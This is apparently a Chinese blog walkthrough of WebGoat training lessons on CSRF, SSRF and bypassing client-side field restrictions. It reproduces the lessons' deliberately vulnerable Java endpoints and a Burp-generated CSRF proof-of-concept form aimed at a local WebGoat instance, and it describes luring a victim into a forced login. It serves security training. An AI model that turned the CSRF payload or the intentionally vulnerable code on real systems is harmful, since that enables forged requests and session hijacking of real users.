<h3 id="CSRFFeedback"><a href="#CSRFFeedback" class="headerlink" title="CSRFFeedback"></a>CSRFFeedback</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.DeserializationFeature;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.exception.ExceptionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;csrf-feedback-hint1&quot;, &quot;csrf-feedback-hint2&quot;, &quot;csrf-feedback-hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSRFFeedback</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserSessionData userSessionData;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ObjectMapper objectMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/csrf/feedback/message&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line"><span class="comment">//    这里需要的是json格式的数据</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(HttpServletRequest request , <span class="meta">@RequestBody</span> String feedback)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES);</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES);</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS);</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY);</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES);</span><br><span class="line">            objectMapper.enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS);</span><br><span class="line">            objectMapper.readValue(feedback.getBytes(), Map.class);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(ExceptionUtils.getStackTrace(e)).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">correctCSRF</span> <span class="operator">=</span> requestContainsWebGoatCookie(request.getCookies()) &amp;&amp; request.getContentType().contains(MediaType.TEXT_PLAIN_VALUE);</span><br><span class="line">        correctCSRF &amp;= hostOrRefererDifferentHost(request);</span><br><span class="line">        <span class="keyword">if</span> (correctCSRF)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;csrf-feedback&quot;</span>,flag);</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;csrf-feedback-success&quot;</span>).feedbackArgs(flag).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/csrf/feedback&quot;, produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">flag</span><span class="params">(<span class="meta">@RequestParam(&quot;confirmFlagVal&quot;)</span> String flag)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag.equals(userSessionData.getValue(<span class="string">&quot;csrf-feedback&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">hostOrRefererDifferentHost</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Referer&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Host&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (referer != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> !referer.contains(host);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">requestContainsWebGoatCookie</span><span class="params">(Cookie[] cookies)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie c : cookies)&#123;</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;JSESSIONID&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里很明显需要发送的是json格式的数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915115051056.png" alt="image-20220915115051056"></p>
<p>我们先按照之前的步骤走走看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915115922082.png" alt="image-20220915115922082"></p>
<p>这里就发现发送的请求就很奇怪 多了个&#x3D; 我们看看怎么回事</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915120033416.png" alt="image-20220915120033416"></p>
<p>这里有一个name 和 一个 value  其中的value 是空 也就是导致构造出来的post 表单是 (name) &#x3D;  这种形式 因此导致多出个 &#x3D; </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915121347911.png" alt="image-20220915121347911"></p>
<p>这里我们进行构造 可以看到这里我们把这个系统添加的 &#x3D; 给利用进去了</p>
<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915134615657.png" alt="image-20220915134615657" style="zoom:150%;" />

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/WebGoat/csrf/feedback/message&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">encType</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">&#123;&quot;name&quot;:&quot;WebGoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;,&quot;subject&quot;:&quot;na&quot;,&quot;message&quot;:&quot;WebGoat is the best!!&#x27;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">value</span>=<span class="string">&#x27;&quot;&#125;&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们重新发送看看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915135148391.png" alt="image-20220915135148391"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915135218882.png" alt="image-20220915135218882"></p>
<h3 id="CSRFLogin"><a href="#CSRFLogin" class="headerlink" title="CSRFLogin"></a>CSRFLogin</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;csrf-login-hint1&quot;, &quot;csrf-login-hint2&quot;, &quot;csrf-login-hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSRFLogin</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CSRFLogin</span><span class="params">(UserTrackerRepository userTrackerRepository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userTrackerRepository = userTrackerRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/csrf/login&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userName</span> <span class="operator">=</span> request.getUserPrincipal().getName();</span><br><span class="line">        <span class="keyword">if</span> (userName.startsWith(<span class="string">&quot;csrf&quot;</span>))&#123;</span><br><span class="line">            markAssignmentSolvedWithRealUser(userName);</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;csrf-login-success&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;csrf-login-failed&quot;</span>).feedbackArgs(userName).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">markAssignmentSolvedWithRealUser</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(userName);</span><br><span class="line">        userTracker.assignmentSolved(getWebSession().getCurrentLesson(), <span class="built_in">this</span>.getClass().getSimpleName());</span><br><span class="line">        userTrackerRepository.save(userTracker);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的csrf 是在测试webgoat的登录界面是否存在csrf漏洞 </p>
<p>注册一个以cstf开头的用户名 其中的密码是你自己设置的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140710128.png" alt="image-20220915140710128"></p>
<p>在登录时创建一个 csrf.html</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140820418.png" alt="image-20220915140820418"></p>
<p>上传 将链接发送给受害者 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140936756.png" alt="image-20220915140936756"></p>
<p>当受害者点击 链接的时候就登录了 我们 csrf-123456 这个账号了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915141034347.png" alt="image-20220915141034347"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915141058633.png" alt="image-20220915141058633"></p>
<p>也就是说这里 如果受害者没有发现这个账号不是他本人的 那么他的操作都会被我们给记录下来</p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSRF</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ssrf.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SSRFTask1"><a href="#SSRFTask1" class="headerlink" title="SSRFTask1"></a>SSRFTask1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;ssrf.hint1&quot;, &quot;ssrf.hint2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSRFTask1</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SSRF/task1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stealTheCheese(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">stealTheCheese</span><span class="params">(String url)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="keyword">if</span> (url.matches(<span class="string">&quot;images/tom.png&quot;</span>))&#123;</span><br><span class="line">                html.append(<span class="string">&quot;&lt;img class=\&quot;image\&quot; alt=\&quot;Tom\&quot; src=\&quot;images/tom.png\&quot; width=\&quot;25%\&quot; height=\&quot;25%\&quot;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;ssrf.tom&quot;</span>)</span><br><span class="line">                        .output(html.toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.matches(<span class="string">&quot;images/jerry.png&quot;</span>)) &#123;</span><br><span class="line">                html.append(<span class="string">&quot;&lt;img class=\&quot;image\&quot; alt=\&quot;Jerry\&quot; src=\&quot;images/jerry.png\&quot; width=\&quot;25%\&quot; height=\&quot;25%\&quot;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;ssrf.success&quot;</span>)</span><br><span class="line">                        .output(html.toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                html.append(<span class="string">&quot;&lt;img class=\&quot;image\&quot; alt=\&quot;Silly Cat\&quot; src=\&quot;images/cat.jpg\&quot;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;ssrf.failure&quot;</span>)</span><br><span class="line">                        .output(html.toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                    .output(e.getMessage())</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改url 为 images%2Fjerry.png 过关 ? 这叫ssrf?</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915143011264.png" alt="image-20220915143011264"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915143058663.png" alt="image-20220915143058663"></p>
<h3 id="SSRFTask2"><a href="#SSRFTask2" class="headerlink" title="SSRFTask2"></a>SSRFTask2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;ssrf.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSRFTask2</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SSRF/task2&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fulBall(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">fulBall</span><span class="params">(String url)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (url.matches(<span class="string">&quot;http://ifconfig.pro&quot;</span>))&#123;</span><br><span class="line">            String html;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url).openStream())&#123;</span><br><span class="line"><span class="comment">//                这里比较好理解 就是初始化了一个url读入流去读取数据 这里当然会存在ssrf了</span></span><br><span class="line">                html = <span class="keyword">new</span> <span class="title class_">String</span>(in.readAllBytes(), StandardCharsets.UTF_8)</span><br><span class="line">                        .replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> getFailedResult(e.getMessage());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                html = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Although the http://ifconfig.pro site is down, you still managed to solve&quot;</span> +</span><br><span class="line">                        <span class="string">&quot; this exercise the right way!&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;ssrf.success&quot;</span>)</span><br><span class="line">                    .output(html).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">var</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;img class=\&quot;image\&quot; alt=\&quot;image post\&quot; src=\&quot;images/cat.jpg\&quot;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> getFailedResult(html);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">getFailedResult</span><span class="params">(String errorMsg)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;ssrf.failure&quot;</span>)</span><br><span class="line">                .output(errorMsg).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915144348783.png" alt="image-20220915144348783"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915144451836.png" alt="image-20220915144451836"></p>
<h2 id="bypass-restrictions"><a href="#bypass-restrictions" class="headerlink" title="bypass_restrictions"></a>bypass_restrictions</h2><h3 id="BypassRestrictions"><a href="#BypassRestrictions" class="headerlink" title="BypassRestrictions"></a>BypassRestrictions</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.bypass_restrictions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRestrictions</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CLIENT_SIDE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bypass-restrictions.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BypassRestrictionsFieldRestrictions"><a href="#BypassRestrictionsFieldRestrictions" class="headerlink" title="BypassRestrictionsFieldRestrictions"></a>BypassRestrictionsFieldRestrictions</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.bypass_restrictions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRestrictionsFieldRestrictions</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/BypassRestrictions/FieldRestrictions&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String select,<span class="meta">@RequestParam</span> String radio,<span class="meta">@RequestParam</span> String checkbox,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String shortInput,<span class="meta">@RequestParam</span> String readOnlyInput)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (select.equals(<span class="string">&quot;option1&quot;</span>) || select.equals(<span class="string">&quot;option2&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (radio.equals(<span class="string">&quot;option1&quot;</span>) || radio.equals(<span class="string">&quot;option2&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (checkbox.equals(<span class="string">&quot;on&quot;</span>) || checkbox.equals(<span class="string">&quot;off&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (shortInput.length() &lt;= <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;change&quot;</span>.equals(readOnlyInput))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关比较简单 但是题目说的不是很清楚</p>
<p>意思就是跳过前段验证</p>
